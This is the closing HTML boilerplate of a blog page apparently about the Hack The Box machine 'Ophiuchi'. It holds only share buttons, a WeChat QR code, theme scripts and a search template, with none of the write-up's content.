        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://www.lucifiel.com/2021/06/01/Hackthebox/Hackthebox-Ophiuchi/&title=《Ophiuchi - Hackthebox》 — Lucifiel's Blog&source=Lucifiel 技术博客" data-title=" QQ">
          <i class="icon icon-qq"></i>
        </a>
      </li>
      <li>
        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://www.lucifiel.com/2021/06/01/Hackthebox/Hackthebox-Ophiuchi/" data-title=" Facebook">
          <i class="icon icon-facebook"></i>
        </a>
      </li>
      <li>
        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《Ophiuchi - Hackthebox》 — Lucifiel's Blog&url=http://www.lucifiel.com/2021/06/01/Hackthebox/Hackthebox-Ophiuchi/&via=http://www.lucifiel.com" data-title=" Twitter">
          <i class="icon icon-twitter"></i>
        </a>
      </li>
      <li>
        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://www.lucifiel.com/2021/06/01/Hackthebox/Hackthebox-Ophiuchi/" data-title=" Google+">
          <i class="icon icon-google-plus"></i>
        </a>
      </li>
    </ul>
 </div>


<div class="page-modal wx-share" id="wxShare">
    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
    <p>扫一扫，分享到微信</p>
    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAN4AAADeCAAAAAB3DOFrAAACtUlEQVR42u3a0WrDMAwF0P7/T3ewp8Ga5Eqykw1OnkpKbB8XIlXy6xVf7+/r5+ejO8n9o29/P3u0hsUXHh4eXmvpyWT59AnsfJzzGZM14+Hh4e3mVYNBHkKOlp5vTbK5h/fx8PDwHuUl3yYLTcbPZ8HDw8P7j7y8ZJAscfIsHh4e3p283ku8l2onYaMXcvDw8PDu4U1eyk993t7fw8PDw2t11auN/+rIyUGE0Wrx8PDwNvDyVn2SHE+We34/T9mjfwx4eHh4G3i9ZDcvUsxnKZSY8fDw8Jbyeq/++cs6aZL1irYf/jHg4eHhLeXlg/YCwKpjAdVtwsPDw9vNyxvweTpbLePOZym3wfDw8PBavB6mGgZ6BdlJmv6hv4eHh4e3lDcvvOZpbq8xlm/oYa0FDw8PbxEvLwTsCBvJyL1jCuU6Bx4eHl7MixLTYNBqWSEPQuVG1/nRATw8PLylvF6ZtXnOqxhI8kIzHh4e3j28wgPFIwW7yxkXeDw8PLwNvN5wyYLmyXTeSLsIQnh4eHhLeXkxoleS6IWBPPBcJPd4eHh4t/OqLbHqt73ibE7Fw8PD28FLFlQtT/TCyTwdPxwfDw8PbykvL4z2Wlm9AkRvnOynxMPDw5vy8ld8IYUtli0mmCjdx8PDw9vGa3bPgpCzClbdejw8PLwdvPnhgOrEvcMK1XXi4eHhPcsbFQLGtYJR2o2Hh4e3gVdt6udl1l5C3GvIJSEHDw8PbxXvXbx6OzfZuGXFCDw8PLxFvFWxZdI2y8G3Hi/Aw8PDO+UlEyepcJIWJ+PnGxSVV/Dw8PC28fJgUF1c0tCqMgrFCzw8PLxHeb2DWdVyRvXZi+3Aw8PD+zO8auGguvQ8tFyMiYeHh7eN1ytGVNtm1XGqQah8gAAPDw+vxas2wPaFjclWviYXHh4eXsr7AutRfYJcLouXAAAAAElFTkSuQmCC" alt="微信分享二维码">
</div>




    <script src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
<script>
var BLOG = { ROOT: '/', SHARE: true, REWARD: false };


</script>

<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/main.min.js"></script>


<div class="search-panel" id="search-panel">
    <ul class="search-result" id="search-result"></ul>
</div>
<template id="search-tpl">
<li class="item">
    <a href="{path}" class="waves-block waves-effect">
        <div class="title ellipsis" title="{title}">{title}</div>
        <div class="flex-row flex-middle">
            <div class="tags ellipsis">
                {tags}
            </div>
            <time class="flex-col time">{date}</time>
        </div>
    </a>
</li>
</template>

<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/search.min.js" async></script>






<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><!-- hexo-inject:begin --><!-- hexo-inject:end -->





</body>
</html>
